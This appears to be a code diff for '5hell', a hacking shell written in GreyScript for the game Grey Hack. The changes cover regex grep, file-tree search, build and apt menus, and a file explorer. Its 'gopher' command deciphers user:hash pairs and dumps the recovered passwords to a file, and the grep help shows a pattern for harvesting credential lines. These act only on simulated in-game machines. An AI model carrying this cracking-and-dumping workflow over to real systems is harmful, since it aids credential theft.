@@ -1,4 +1,4 @@
-if DEBUG then print("<size=75%>loading dtools.5pk...(62.957kb)</size>")
+if DEBUG then print("<size=75%>loading dtools.5pk v 3.6.9.8...(102.042kb)</size>")
 re = {}
 re.match = function(regexp, text) // expects character arrays
 	if DEBUG then print("<b> in globals.re(gex)")
@@ -8,36 +8,35 @@ re.match = function(regexp, text) // expects character arrays
 	end if
   while text.len > 0
     if re.match_here(regexp, text) then return 1
-
 		text.pull
   end while
   return 0
 end function
 re.match_here = function(regexp, text)
   if not regexp then return 1
-  if regexp.len > 1 and regexp[1] == "*" then
-		//return self.match_star(regexp[0], regexp[2:], text)
-		char = regexp.pull
-		regexp.pull
-		return re.match_star(char, regexp, text)
+  if regexp.len > 1 and regexp[1] == "#" then // switched * to # for testing
+		return self.match_star(regexp[0], regexp[2:], text)
+		//char = regexp.pull
+		//regexp.pull
+		//return re.match_star(char, regexp, text)
 	end if
   if regexp[0] == "$" and not regexp.hasIndex(1) then
     if text.hasIndex(1) then return 0 else return 1
   end if
-  if text.len > 0 and (regexp[0] == "." or regexp[0] == text[0]) then
-		//return self.match_here(regexp[1:], text[1:])
-		regexp.pull
-		text.pull
-		return re.match_here(regexp,text)
+  if text.len > 0 and (regexp[0] == "*" or regexp[0] == text[0]) then // switched . to * for testing
+		return self.match_here(regexp[1:], text[1:])
+		//regexp.pull
+		//text.pull
+		//return re.match_here(regexp,text)
 	end if
   return 0
 end function
 // re.match_star needs work. misses certain cases.
 re.match_star = function(c, regexp, text)
-  while text.len and (text[0] == c or c == ".")
+  while text.len and (text[0] == c or c == "*") // changed from . to * for testing
     if re.match_here( regexp, text) then return 1
-    //text = text[1:]
-		text.pull
+    text = text[1:]
+		//text.pull
   end while
   return 0
 end function
@@ -258,7 +257,7 @@ command.gopher = function(arg1, arg2, arg3=0, arg4=0) // requires crypto.so
         if arg1.indexOf(char(10)) >= 0 then 
           data = arg1.split(char(10))
         else 
-          if arg1.indexOf(":") and arg1.len > 32 then data = arg1 else return "gopher: invalid string"
+          if arg1.indexOf(":") and arg1.len > 32 then data = arg1 else return "gopher: skipping invalid string"
         end if
       end if
     end if
@@ -269,22 +268,23 @@ command.gopher = function(arg1, arg2, arg3=0, arg4=0) // requires crypto.so
   if DEBUG then print("data type is: "+typeof(data))
   if typeof(data) == "list" then
     for element in data 
+      if element == "" or element == " " then continue
       ctc = (command.gopher( element ))
       if ctc then print ctc
     end for
   end if
   if typeof(data) == "string" then 
-    if DEBUG then print("starting decipher on: "+data)
+    print("gopher: deciphering:<b> "+data)
     user = "unknown_user"
     if data.indexOf(":") then
       data = data.split(":")
       user = data[0]
       data = data[1]
     end if 
-    if data.len != 32 then return "gopher: invalid hash string"
+    if data.len != 32 then return "gopher: skipping invalid hash string"
     pass = command.md5("-d",data) // decipher here
     output = user + ":" + pass
-    print("["+colorGold+output+"]")
+    print("["+colorGold+output+CT+"]")
     dump = command.tree("/","dump.txt","1","n")
     if not dump then 
       command.poke("dump.txt")
@@ -298,31 +298,77 @@ command.gopher = function(arg1, arg2, arg3=0, arg4=0) // requires crypto.so
   return 0
 end function
 command.grep = function(a1, a2, arg3=0, arg4=0)
-	if not a1 or not a2 or a1 == "-h" or a1 == "help" then return "Usage: grep [string] [file/folder]"+char(10)+"Advanced: grep [string] [object] -- search piped object (shell|file|computer) for string. "+char(10)+"-- piped computer and shell objects will be searched from / directory."+char(10)+"-- piping a file object searches from path of file."+char(10)+"n.b. supports partial matches and limited regular expressions."+char(10)+"<u>current regex tokens (more planned):</u>"+char(10)+"c   matches any literal character 'c'"+char(10)+"-- bob matches bob anywhere in the text."+char(10)+"^   match pattern from beginning of word"+char(10)+"-- ^ber matches bertha  does not match robert"+char(10)+"$   match end of line (goes at end of pattern)"+char(10)+"-- .txt$ matches file.txt does not match file.txt.src"+char(10)+"*   matches one or more of preceding character"+char(10)+"-- c* matches c, cc, ccc, cccc "+char(10)+".   matches any unicode char (wildcard)"+char(10)+"-- .*:.*  matches root:password, email@domain.com:password, xyz:1234"+char(10)+"Important! Runtime depends on length of pattern and size of text to check. Since grep will recurse any folders in a given path, this command could result in very long run times. It is up to you to limit the scope of your searches accordingly."
+	find_file = false
+	return_name = false
+	globals.grepped_file = null
+	if a1 and a1 == "-f" or a1 == "-n" or a1 == "-fn" then
+		find_file = true 
+		if a1 == "-n" or a1 == "-fn" then return_name = true
+		if DEBUG then print "debug: grep: findfile == true"
+		a1 = a2
+		a2 = arg3
+	end if
+	if not a1 or a1 == "-h" or a1 == "help" then return "GREP || get regular expression || regex"+char(10)+"Usage: grep [opt:-f] [pattern] [opt:file/folder (default: / )] - search file or folder for pattern"+char(10)+"Usage: grep [string] [object] - search piped object (shell|file|computer) for pattern. "+char(10)+"-- piped computer and shell objects will be searched from / directory."+char(10)+"-- piping a file object searches from path of file."+char(10)+"-- n.b. supports partial matches and limited regular expressions."+char(10)+"<u>current regex tokens (more planned):</u>"+char(10)+"c   matches any literal character 'c'"+char(10)+"-- bob matches bob anywhere in the text."+char(10)+"^   match pattern from beginning of word"+char(10)+"-- ^ber matches bertha  does not match robert"+char(10)+"$   match end of line (goes at end of pattern)"+char(10)+"-- .txt$ matches file.txt does not match file.txt.src"+char(10)+"#   matches one or more of <b>preceding</b> character"+char(10)+"-- c# matches c, cc, ccc, cccc "+char(10)+"*   matches any unicode char (wildcard)"+char(10)+"-- *#:*#  matches root:password, email@domain.com:password, xyz:1234"+char(10)+"Important! Runtime depends on length of pattern and size of text to check. \nSince grep will recurse any folders in a given path, this command could result in very long run times. \nIt is up to you to limit the scope of your searches accordingly."+char(10)+"<b>Advanced: grep -f [pattern] [path|object] \n-- searches for pattern and returns first matching file object in path_tree</b>"+char(10)+"Note: grep does not (yet) support grepping piped text. "+char(10)+"-- it will search files, folders and text within files."+char(10)+"-- returns a file object if -f param is used"
 	gresult = []
-	gp = function(grep_tar, t_f, use_re)
+	gname = null
+
+	gp = function(grep_tar, t_f, use_re, findfile)
 		if t_f.is_folder and t_f.is_binary then
 			sub_folders = t_f.get_folders
 			sub_files = t_f.get_files
 			g_buf = null
+    		if globals.grepped_file != null then return 
 			for sub in sub_folders
 				if use_re == true then
-					if re.match(grep_tar.values, sub.name.values) then gresult.push(colorLightBlue+"Found folder: "+CT+colorOrange+sub.name+CT+colorLightBlue+" in: "+ sub.parent.path + CT)
+					if re.match(grep_tar.values, sub.name.values) then 
+						gresult.push(colorLightBlue+"Found folder: "+CT+colorOrange+sub.name+CT+colorLightBlue+" in: "+ sub.parent.path + CT)
+						if findfile == true then
+							print gresult[-1]
+							globals.grepped_file = sub
+							gname = sub.name
+							if DEBUG then print "debug: found "+sub.path
+							return
+						end if
+					end if
 				else
-					if sub.name == grep_tar or sub.name.indexOf(grep_tar) then gresult.push(colorLightBlue+"Found folder: "+CT+colorOrange+sub.name+CT+colorLightBlue+" in: "+ sub.parent.path + CT)
+					if sub.name == grep_tar or sub.name.indexOf(grep_tar) then 
+						gresult.push(colorLightBlue+"Found folder: "+CT+colorOrange+sub.name+CT+colorLightBlue+" in: "+ sub.parent.path + CT)
+						if findfile == true then
+						if DEBUG then print "debug: found "+sub.path
+						print gresult[-1]
+						globals.grepped_file = sub
+						return
+						end if
+					end if
 				end if
-				gp(grep_tar, sub, use_re)
+				gp(grep_tar, sub, use_re, findfile)
 			end for
 			for f in sub_files
 				if use_re == true then
-					if re.match(grep_tar.values, f.name.values) then gresult.push(colorLightBlue+"Found file: "+CT+colorOrange+f.name+CT+colorLightBlue+" in: "+ f.parent.path + CT)
+					if re.match(grep_tar.values, f.name.values) then 
+            			gresult.push(colorLightBlue+"Found file: "+CT+colorOrange+f.name+CT+colorLightBlue+" in: "+ f.parent.path + CT)
+						if findfile == true then
+							if DEBUG then print "debug: found "+f.path
+							print gresult[-1]
+							globals.grepped_file = f
+							return
+						end if
+          			end if
 				else
-					if f.name == grep_tar or f.name.indexOf(grep_tar) >= 0 then gresult.push(colorLightBlue+"Found file: "+CT+colorOrange+f.name+CT+colorLightBlue+" in: "+ f.parent.path + CT)
+					if f.name == grep_tar or f.name.indexOf(grep_tar) >= 0 then 
+						gresult.push(colorLightBlue+"Found file: "+CT+colorOrange+f.name+CT+colorLightBlue+" in: "+ f.parent.path + CT)
+						if findfile == true then
+							if DEBUG then print "debug: found "+f.path  
+							print gresult[-1]
+							globals.grepped_file = f
+							return
+						end if
+          			end if
 				end if
-				gp(grep_tar, f, use_re)
+				gp(grep_tar, f, use_re, findfile)
 			end for
 		end if
-		if t_f.is_binary then return
+		if t_f.is_binary or findfile == true then return
 		buf = t_f.get_content
 		if buf == "" or buf == null then return
 		lines = buf.split(char(10))
@@ -336,15 +382,17 @@ command.grep = function(a1, a2, arg3=0, arg4=0)
 				end if
 			end for
 		end for
-	end function
+  end function
+
 	output = "No "+a1+" found."
 	t_f = null // target file or folder
 	grep_tar = a1.trim
 	invoke_regex = false
-	special_chars = ["*","^","$","."]
+	special_chars = ["*","^","$","#"] // * changed to #, . changed to *
 	for special in special_chars
 		if grep_tar.indexOf(special) >= 0 then invoke_regex = true
 	end for
+  if not a2 then a2 = "/"
 	tf_path = a2
 	if typeof(tf_path) == "string" then
 		t_f = globals.get_file(tf_path)
@@ -356,13 +404,48 @@ command.grep = function(a1, a2, arg3=0, arg4=0)
 	if typeof(tf_path) == "shell" then t_f = tf_path.host_computer.File("/")
 	if typeof(t_f) != "file" then return "grep: "+a2+": unkown type."
 	// end piped object handling.
-	gp(grep_tar, t_f, invoke_regex)
+	gp(grep_tar, t_f, invoke_regex, find_file)///////////////////////////////fire away!
+  	if DEBUG then print "debug: ggf: "+typeof(globals.grepped_file)
+  	if globals.grepped_file then 
+		if return_name then return gname
+ 	 	return globals.grepped_file
+	end if
 	if gresult != [] then output = gresult.join(char(10))
 	return output
 end function
 command.tree = function(arg1, arg2=0, arg3=0, arg4=0)
-	if arg1 == "-h" or arg1 == "help" then return "Usage: tree -- view filesystem tree (from / if no argument)"+char(10)+"Usage: <b>tree [path]</b> -- view filesystem from path down"+char(10)+"Usage: tree [opt: path] [opt: grep_target] [bool: 1/0] [opt: R|Y|N]"+char(10)+"-- [path] - path to descend"+char(10)+"-- [grep_target] - search for traget file by name"+char(10)+"<b>-- Returns a file object if grep_target and grep is successful.</b>"+char(10)+"-- [1|0] -  1 = quiet, supress output"+char(10)+"-- [1|0] - 0 = verbose, print output"+char(10)+"-- [r|n|y] - r = to tbuf, n = skip, y = decipher in place (default is <b>R</b>)"+char(10)+"-- see command.clipa|b|c for more (ie <b>clipb -h</b>)"+char(10)+"Advanced: tree @clipa/b/c [grep] [1|0] [r|y|n] -- tree from object in [clipa/b/c] [optional grep] [quiet_mode] [rmote|yes|no]"+char(10)+"e.g. -<b> tree / database.csv 1 N | file -b</b> -- find database.csv on filesystem, display properties and send to BUFFER (if database.csv exists)."+char(10)+"N.B. You may use @a, @b, @c in place of @clipa, @clipb, @clipc if you prefer."+char(10)+"<b>Function returns a file if grep is successful.</b>"
+	if arg1 == "-h" or arg1 == "help" then return "<b><u>tree || list files || file grep"+char(10)+
+	"Usage: <b>tree</b> -- view filesystem tree (from / if no argument)"+char(10)+
+	"Usage: tree [path|object] -- view filesystem from path down"+char(10)+
+	"Usage: tree [opt: path|object] [opt: grep_target] [quiet: 1|0] [opt: r|y|n]"+char(10)+
+	"-- [path] - path to descend"+char(10)+
+	"-- [object] - shell or computer: descends from / on object"+char(10)+
+	"-- [object] - file: descends from path of file object on said object"+char(10)+
+	"-- [grep_target] - search for target file by name"+char(10)+
+	"---- matches exact name (no regex)"
+	"---- <b>returns the file as an object if found</b>"+char(10)+
+	"-- [1|0] -  1 = quiet, supress output"+char(10)+
+	"-- [1|0] -  0 = verbose, print output"+char(10)+
+	"-- [r|n|y] - r = to t_buf, n = ignore, y = decipher (default is <b>r</b>)"+char(10)+
+	"---- see command.clipa|b|c for more (ie <b>clipb -h</b>)"+char(10)+
+	"-- e.g:<b> tree / database.csv 1 N | file -b</b> "+char(10)+
+	"---- find database.csv on filesystem, display properties, pipe to BUFFER"+char(10)+
+	"N.B. You may use @a, @b, @c or @clipa, @clipb, @clipc to reference [object]"+char(10)+
+	"-- "+char(10)+
+	"<b>New: tree -f [path|object] [opt: 1|0] - tree a directory or object and enumerate all files "+char(10)+
+	"-- omitting path|object (and opt) defaults to the / path"
+	"-- [opt: 1] - quiet mode. suppress output."+char(10)+
+	"-- [opt: 0] - print output. any value other than [1] will print output"+char(10)+
+	"---- omitting this option will print output"+char(10)+
+	"-- enumerates to the enum buffer. see <b>enum -h</b> for instructions on how to use it"
 	tem = null
+	use_new_tree = false
+	if arg1 == "-f" then 
+		use_new_tree = true 
+		arg1 = arg2 
+		arg2 = arg3 
+		arg3 = arg4 
+	end if 
 	if arg1 then
 		if arg1 == "@clipa" or arg1 == "@a" then arg1 = globals.clip_board_alpha
 		if arg1 == "@clipb"  or arg1 == "@b" then arg1 = globals.clip_board_beta
@@ -370,18 +453,15 @@ command.tree = function(arg1, arg2=0, arg3=0, arg4=0)
 		if typeof(arg1) == "string" then tem = localmachine.File(arg1)
 		if typeof(arg1) == "shell" or typeof(arg1) == "ftpshell" then tem = arg1.host_computer.File("/")
 		if typeof(arg1) == "computer" then tem = arg1.File("/")
-		if typeof(arg1) == "file" then
-			while arg1.name != "/"
-				arg1 = arg1.parent
-			end while
-			tem = arg1
-		end if
+		if typeof(arg1) == "file" then tem = arg1
 	else
 		tem = localmachine.File("/")
 	end if
+	if not tem or not p_validate(tem) then return "tree: invalid path or file"
 	if arg3 == "0" then arg3 = 0
+	if use_new_tree == true then return globals.newtree(tem,arg2)
 	globals.grepped_file = null
-	if tem then globals.list_files(tem, arg2, arg3, arg4)
+	globals.list_files(tem, arg2, arg3, arg4)
 	if arg2 and globals.grepped_file and globals.grepped_file.name == arg2 then return globals.grepped_file
 	return 0
 end function
@@ -417,7 +497,7 @@ command.makfit = function(arg1, arg2, arg3=0, arg4=0)
 		command.perms("lock","all")
 	end if
 	print(colorLightBlue+"Building "+CT+colorWhite+ og_name +CT+colorLightBlue+" to file size <= " +CT+colorWhite+ SIZE +CT+colorLightBlue+" bytes. "+CT)
-	og_name = og_name.split(".")[0]
+	og_name = og_name.split("\.")[0]
 	if DEBUG then print("og_name: "+og_name)
 	print("<align=center>"+char(3675)+"</align>")
 	last_size = (SIZE + 1000)
@@ -469,6 +549,7 @@ command.makfit = function(arg1, arg2, arg3=0, arg4=0)
 			out_file.delete
 			temp.delete
 		end if
+    wait(.1)
 	end while
 	//
 	time_end = time
@@ -486,14 +567,15 @@ command.makfit = function(arg1, arg2, arg3=0, arg4=0)
 	return out_file
 end function
 command.make = function(arg1, arg2, arg3=0, arg4=0)
-	if arg1 == "help" or arg1 == "-h" or arg1 == 0 or arg2 == 0 then return "Usage: make [/path/file.src] [/path/destination_folder] -- build the .src file and ouput to destination folder."+char(10)+"-- final file name will be input file name with .src stripped."+char(10)+"e.g.<b> make /root/src/5hell.src /bin </b>-- build 5hell.src into a binary and output to:<b> /bin/5hell</b>"+char(10)+"n.b. make requires the source file have the .src extension."
+	if arg1 == "help" or arg1 == "-h" or arg1 == 0 or arg2 == 0 then return "</u>Make || Build</u>"+char(10)+"Usage: make [/path/file.src] [/destination/folder] [bool_importable: true/false | 1/0]"+char(10)+"-- build the .src file and ouput to destination folder."+char(10)+"-- final file name will be input file name with .src stripped."+char(10)+"-- e.g.<b> make /root/src/5hell.src /bin </b>"+char(10)+"-- build 5hell.src into a binary and output to:<b> /bin/5hell</b>"+char(10)+"-- n.b. make requires the source file to have the .src extension."+char(10)+"-- importable code can be imported by other sources when building."+char(10)+"-- this allows you to build programs with more than 160 characters by importing multiple source files."
 	pathSource = arg1
 	programPath = arg2
+  if arg3 then importableCode = arg3.to_int else importableCode = arg3
 	fileSource = globals.get_file(pathSource)
 	folderDest = globals.get_file(programPath)
 	if not fileSource then return("build: can't find "+ pathSource)
 	if not folderDest then return("build: can't find " + folderDest)
-	output = shell.build(fileSource.path, folderDest.path)
+	output = shell.build(fileSource.path, folderDest.path, importableCode)
 	if output.len == 0 then
 		return("build successful.")
 	else
@@ -502,10 +584,14 @@ command.make = function(arg1, arg2, arg3=0, arg4=0)
 	return 0
 end function
 command.aptm = function(arg1, arg2, arg3=0, arg4=0) // requires aptclient.so
-	if arg1 == "-h" or arg1 == "help" then return "aptm: apt-get menu -- manage apt functions, add/remove/search repositories."+char(10)+"Advanced: [7] hot_swap_libs -- reload meta/crypto/apt to use latest versions after updating."
-  if not globals.apt_get then return colorRed+"Error:aptclient.so not found in /lib or current_path"+CT
-  if GLASSPOOL then print(colorOrange+"Ignores Glasspool."+CT)
+	if arg1 == "-h" or arg1 == "help" then return "<u>Apt-Get Menu</u>"+char(10)+"Usage: aptm -- apt-get menu: "+char(10)+"-- manage apt functions"+char(10)+"-- add/remove/search repositories."+char(10)+"Usage: aptm [piped_aptclientLib] -- change scope of aptm to supplied lib"+char(10)+"-- eg: bios -a | cob set apt | exit"+char(10)+"-- when used on a remote 'silent launch' of 5hell"+char(10)+"---- pipes aptclientLib to the custom object then exits back to original 5hell"+char(10)+"-- cob get apt | aptm"+char(10)+"---- pipes aptclientLib to aptm and changes scope of aptm to remote"+char(10)+"Advanced: press [7] hot_swap_libs in aptm "+char(10)+"-- reloads meta/crypto/apt to use latest versions after updating"
+  	if not globals.apt_get then return colorRed+"Error:aptclient.so not found in /lib or current_path"+CT
+  	if GLASSPOOL then print(colorOrange+"Ignores Glasspool."+CT)
 	// apt menu by Plu70
+	if arg1 and typeof(arg1) == "aptclientLib" then
+		print "apt-get-menu: importing alternate aptclientLib"+char(10)+"-- pipe the old lib back to restore"+char(10)+"-- eg: liber -i /lib/aptclient.so | aptm"
+		globals.apt_get = arg1 
+	end if
 	apt = {}
 	apt.exit = function()
 		return 0
@@ -588,7 +674,7 @@ command.aptm = function(arg1, arg2, arg3=0, arg4=0) // requires aptclient.so
 	return 0
 end function
 // felix file explorer by, Plu70
-if DEBUG then print("<size=75%>loading felix.5pk...(13.691kb)</size>")
+if DEBUG then print("<size=75%>loading felix.5pk...(13.584kb)</size>")
 command.felix = function(arg1, arg2=0, arg3=0, arg4=0)
   if arg1 == "help" or arg1 == "-h" then return "Usage: felix -- file explorer v 0.2, (wip). Use arrow keys to navigate. Press / to manually type a path."+char(10)+"Advanced: felix [shell|computer|file] -- run felix on filesys of piped object."+char(10)+"e.g. clipb @B 1 | felix -- where BUFFER[1] contained a file, shell or computer."
   action = {}
@@ -710,7 +796,7 @@ command.felix = function(arg1, arg2=0, arg3=0, arg4=0)
       return inf
     end if
     if selected.is_binary then // run prompt
-      if selected.name.split(".")[-1] != "so" then
+      if selected.name.split("\.")[-1] != "so" then
         doit = user_input("launch "+selected.name+"? [y/N] "+char(10)+"||: ",0,1).lower
         if doit == "y" or doit == "RightArrow" then
           if typeof(shell) == "ftpshell" then
@@ -900,14 +986,19 @@ command.felix = function(arg1, arg2=0, arg3=0, arg4=0)
 end function
 
 command.file = function(arg1, arg2=0, arg3=0, arg4=0)
-	if not arg1 or arg1 == "help" or arg1 == "-h" then return "Usage: file [/path|file_object] -- file properties information. Takes path or file_object and returns string. "+char(10)+"Usage: file [-l|-c] [/path|file_object] -- returns int lines or int chars for given file."+char(10)+"Example: (copy the command in bold)<b> tree /root Config 0 N | file </b>"+char(10)+"Advanced: file -b [/path|file_object] -- send file to BUFFER (and display file info)"
-  get_lines = false
+	if not arg1 or arg1 == "help" or arg1 == "-h" then return colorGreen+"File || Properties || Inspect File"+char(10)+"Usage: file [/path|file_object] -- file properties information. "+char(10)+"-- takes path or file_object and returns string "+char(10)+"Usage: file [-l|-c] [/path|file_object] -- returns int [-l]ines | int [-c]hars for given file"+char(10)+"-- eg:<b> tree /root Config 0 N | file -l</b>"+char(10)+"Advanced: file -b [/path|file_object] -- send file to BUFFER (and display file info)"+char(10)+"-- eg: grep *.log / | file -b"+char(10)+"Usage: file [-n|-p] -- returns file [-n]ame | file [-p]ath"+"-- eg: grep ^meta / | file -n | liber -l"+char(10)+"-- same as liber -l metaxploit.so"
+  	get_lines = false
 	get_chars = false
-  to_buffer = false
-	if arg1 == "-l" or arg1 == "-c" or arg1 == "-b" then
+  	to_buffer = false
+	return_name = false
+	return_path = false
+
+	if arg1.indexOf("-") >= 0 then //== "-l" or arg1 == "-c" or arg1 == "-b" then
 		if arg1 == "-l" then get_lines = true
 		if arg1 == "-c" then get_chars = true
-    if arg1 == "-b" then to_buffer = true
+    	if arg1 == "-b" then to_buffer = true
+		if arg1 == "-n" then return_name = true
+		if arg1 == "-p" then return_path = true
 		if arg2 then arg1 = arg2 else return "file: input error"
 	end if
 	if typeof(arg1) == "string" then
@@ -917,9 +1008,11 @@ command.file = function(arg1, arg2=0, arg3=0, arg4=0)
 		arg1 = file
 	end if
 	if typeof(arg1) == "file" then
-    imp_status = arg1.allow_import
-    if imp_status then imp_status = "Yes" else imp_status = "No"
-  	file_id_info = ["name: "+arg1.name, "path: "+arg1.path, "size: "+arg1.size, "owner: "+arg1.owner, "group: "+arg1.group, "perms: "+arg1.permissions]
+		if return_path then return arg1.path
+		if return_name then return arg1.name
+    	imp_status = arg1.allow_import
+    	if imp_status then imp_status = "Yes" else imp_status = "No"
+  		file_id_info = ["name: "+arg1.name, "path: "+arg1.path, "size: "+arg1.size, "owner: "+arg1.owner, "group: "+arg1.group, "perms: "+arg1.permissions]
 		if arg1.is_folder then
 			file_id_info.push("type: folder")
 			conts = arg1.get_folders.len + arg1.get_files.len
@@ -927,7 +1020,7 @@ command.file = function(arg1, arg2=0, arg3=0, arg4=0)
 		else
 			if arg1.is_binary then
 				file_id_info.push("type: binary")
-        file_id_info.push("import: "+imp_status)
+				file_id_info.push("import: "+imp_status)
 			else
 				file_id_info.push("type: ascii")
 				lines = 0
@@ -946,11 +1039,11 @@ command.file = function(arg1, arg2=0, arg3=0, arg4=0)
 		if get_chars then
 			if file_id_info.indexOf("type: binary") == null then return str(chars) else return "file: "+arg1.path+" is binary"
 		end if
-    print(colorGreen+"<u>==================================</u>"+CT)
-    if to_buffer then
-      globals.BUFFER.push(arg1)
-      print("file: <b>"+arg1.name+"</b> sent to <b>BUFFER</b>")
-    end if
+    	print(colorGreen+"<u>==================================</u>"+CT)
+		if to_buffer then
+			globals.BUFFER.push(arg1)
+			print("file: <b>"+arg1.name+"</b> sent to <b>BUFFER</b>")
+		end if
 		return format_columns(file_id_info.join(char(10)))
 	end if
 	return "file: unknown error"
@@ -969,199 +1062,199 @@ if DEBUG then print("<size=75%>loading herme5.5pk...(8.142kb)</size>")
 // end globals
 /////////////////////////
 
-  // cobble, get_custom_object interface by Plu70
-  if DEBUG then print("<size=75%>loading cobble.5pk...(6.251kb)</size>")
+// cobble, get_custom_object interface by Plu70
+if DEBUG then print("<size=75%>loading cobble.5pk...(6.251kb)</size>")
 
-  //command={}
-  command.cob = function(arg1,arg2,arg3=0,arg4=0)
-    usage_info = "<u>Cobble || custom object || cob || meta buffer</u>"+char(10)+"Usage: cob set [key] [val] -- set custom object key to val."+char(10)+"-- returns string on success or error"+char(10)+"Usage: cob get [key] -- get value of custom object key."+char(10)+"-- returns value at key or returns null on failure"+char(10)+"-- returns @reference (pointer) if value is a function"+char(10)+"Usage: cob return -- returns the raw custom object"+char(10)+"-- pipe to command.<b>code</b> to decompile the object."+char(10)+"-- ie:<b> cob return | code</b>"+char(10)+"Usage: cob inspect -- returns decompiled custom object (same as cob return | code)."+char(10)+"Usage: cob search [val] --  search for index of val."+char(10)+"-- returns string; key or failure message."+char(10)+"Inactive: cob sign -- future ability to sign custom object."+char(10)+"-- currently returns 0 (zero)."+char(10)+"Usage: cob del [key] -- delete key and its value from custom object."+char(10)+"-- returns string on success or failure."+char(10)+"Usage: cob install [key] [val] -- install piped function (val) to command.[key]"+char(10)+"-- i.e. install functions from custom object to command list"+char(10)+"Advanced: to export the onboard dictionary to the custom object:"+char(10)+"--<b> enum -d |  | enum -e | cob set dictionary</b>"+char(10)+"Advanced: to import from the custom object to the onboard dictionary"+char(10)+"--<b> cob get [dictionary] | cerebrum -i</b>"+char(10)+"OR just use<b> cob export and cob import"+char(10)+"Advanced: cob export -- export onboard dictionary to custom object"+char(10)+"Advanced: cob import -- import from custom object dictionary to onboard dictinary"+char(10)+"N.B. this is allows you to run cerebrum once, then export/import to nested shell.launches."
-    if not arg1 or arg1 == "help" or arg1 == "-h" then return usage_info
+//command={}
+command.cob = function(arg1,arg2,arg3=0,arg4=0)
+  usage_info = "<u>Cobble || custom object || cob || meta buffer</u>"+char(10)+"Usage: cob set [key] [val] -- set custom object key to val."+char(10)+"-- returns string on success or error"+char(10)+"Usage: cob get [key] -- get value of custom object key."+char(10)+"-- returns value at key or returns null on failure"+char(10)+"-- returns @reference (pointer) if value is a function"+char(10)+"Usage: cob return -- returns the raw custom object"+char(10)+"-- pipe to command.<b>code</b> to decompile the object."+char(10)+"-- ie:<b> cob return | code</b>"+char(10)+"Usage: cob inspect -- returns decompiled custom object (same as cob return | code)."+char(10)+"Usage: cob search [val] --  search for index of val."+char(10)+"-- returns string; key or failure message."+char(10)+"Inactive: cob sign -- future ability to sign custom object."+char(10)+"-- currently returns 0 (zero)."+char(10)+"Usage: cob del [key] -- delete key and its value from custom object."+char(10)+"-- returns string on success or failure."+char(10)+"Usage: cob install [key] [val] -- install piped function (val) to command.[key]"+char(10)+"-- i.e. install functions from custom object to command list"+char(10)+"Advanced: to export the onboard dictionary to the custom object:"+char(10)+"--<b> enum -d |  | enum -e | cob set dictionary</b>"+char(10)+"Advanced: to import from the custom object to the onboard dictionary"+char(10)+"--<b> cob get [dictionary] | cerebrum -i</b>"+char(10)+"OR just use<b> cob export and cob import"+char(10)+"Advanced: cob export -- export onboard dictionary to custom object"+char(10)+"Advanced: cob import -- import from custom object dictionary to onboard dictinary"+char(10)+"N.B. this is allows you to run cerebrum once, then export/import to nested shell.launches."
+  if not arg1 or arg1 == "help" or arg1 == "-h" then return usage_info
 
-    cobble = get_custom_object
-    cob = {}
-    cob.set = function( key=0, val=0, nil=0, nul=0 )
-      if not @key then return null
-      if typeof(@key) == "function" then
-        if typeof(@val) == "function" then
-          cobble[@key] = @val
-        else
-          cobble[@key] = val
-        end if
+  cobble = get_custom_object
+  cob = {}
+  cob.set = function( key=0, val=0, nil=0, nul=0 )
+    if not @key then return null
+    if typeof(@key) == "function" then
+      if typeof(@val) == "function" then
+        cobble[@key] = @val
       else
-        if typeof(@val) == "function" then
-          cobble[key] = @val
-        else
-          cobble[key] = val
-        end if
+        cobble[@key] = val
       end if
-      if cobble.hasIndex( @key ) then return "cob: set<b> "+@key+"</b> to <b>"+@val+"</b>." else return "cob: set error."
-    end function
-
-    cob.get = function( key=0, val=0, nil=0, nul=0 )
-      if cobble.hasIndex( @key ) then return cobble[@key]
-      if cobble.hasIndex( key ) then return cobble[ key ]
-      return "cob: key not found"
-    end function
-
-    cob.search = function ( val=0, key=0, nil=0, nul=0 )
-      if cobble.indexOf( @val ) != null then
-        if typeof(@val) == "function" then return cobble.indexOf( @val )
-        return cobble.indexOf( val )
+    else
+      if typeof(@val) == "function" then
+        cobble[key] = @val
       else
-        if cobble.indexOf( val ) != null then return cobble.indexOf( val )
-        return "cob: value not found."
+        cobble[key] = val
       end if
-    end function
+    end if
+    if cobble.hasIndex( @key ) then return "cob: set<b> "+@key+"</b> to <b>"+@val+"</b>." else return "cob: set error."
+  end function
 
-    cob.inspect = function( key=0, val=0, nil=0, nul=0 )
-      return command.code(cobble,0,0,0)
-    end function
+  cob.get = function( key=0, val=0, nil=0, nul=0 )
+    if cobble.hasIndex( @key ) then return cobble[@key]
+    if cobble.hasIndex( key ) then return cobble[ key ]
+    return "cob: key not found"
+  end function
 
-    cob.del = function( key=0, val=0, nil=0, nul=0 )
-      if typeof(@key) == "function" then
-        if cobble.remove( @key ) then return "cob: removed key: <b>"+@key+"</b>." //else return "cob: key not found."
-      else
-        if cobble.remove( key ) then return "cob: removed key: <b>"+key+"</b>." else return "cob: key not found."
-      end if
-    end function
+  cob.search = function ( val=0, key=0, nil=0, nul=0 )
+    if cobble.indexOf( @val ) != null then
+      if typeof(@val) == "function" then return cobble.indexOf( @val )
+      return cobble.indexOf( val )
+    else
+      if cobble.indexOf( val ) != null then return cobble.indexOf( val )
+      return "cob: value not found."
+    end if
+  end function
 
-    cob.sign = function( key=0, val=0, nil=0, nul=0 )
-      return cob.set( "signature" , command.code("-a", key))
-    end function
+  cob.inspect = function( key=0, val=0, nil=0, nul=0 )
+    return command.code(cobble,0,0,0)
+  end function
 
-    cob.install = function(key=0, val=0, nil=0, nul=0)
+  cob.del = function( key=0, val=0, nil=0, nul=0 )
+    if typeof(@key) == "function" then
+      if cobble.remove( @key ) then return "cob: removed key: <b>"+@key+"</b>." //else return "cob: key not found."
+    else
+      if cobble.remove( key ) then return "cob: removed key: <b>"+key+"</b>." else return "cob: key not found."
+    end if
+  end function
+
+  cob.sign = function( key=0, val=0, nil=0, nul=0 )
+    return cob.set( "signature" , command.code("-a", key))
+  end function
+
+  cob.install = function(key=0, val=0, nil=0, nul=0)
+    g = @cob.get
+    new_command = g(key)
+    if typeof(@new_command) == "string" then return key +": "+ new_command + ". Install failed."
+    if typeof(@new_command) == "function" then 
+      command[key] = @new_command 
+      return "Set command."+key+" to "+@new_command
+    else 
+      return "cob: install expects a function"
+    end if
+  end function
+
+  if arg1 == "return" then return cobble
+  if arg1 == "install" then 
+    return cob.install(arg2)
+  end if
+  if arg1 == "set" then
+    if @arg3 then
+      //if @arg2 == "@clipa" then arg2 = @globals.clip_board_alpha
+      //if @arg2 == "@clipb" then arg2 = @globals.clip_board_beta
